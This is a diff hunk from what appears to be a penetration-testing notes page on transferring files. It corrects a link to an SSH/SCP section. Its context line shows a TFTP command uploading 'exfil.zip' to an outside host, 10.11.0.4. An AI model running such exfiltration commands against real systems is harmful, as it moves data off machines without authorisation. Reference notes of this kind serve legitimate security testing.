@@ -275,7 +275,7 @@ tftp -i 10.11.0.4 put exfil.zip
 
 ### SCP
 
-SCP tranfsers files through SSH See [SCP section ](../tools/ssh-and-scp.md)for more.
+SCP tranfsers files through SSH See [SCP section ](../pivoting-lateral-movement/pivoting/ssh-and-scp.md)for more.
 
 ```shellscript
 Get file
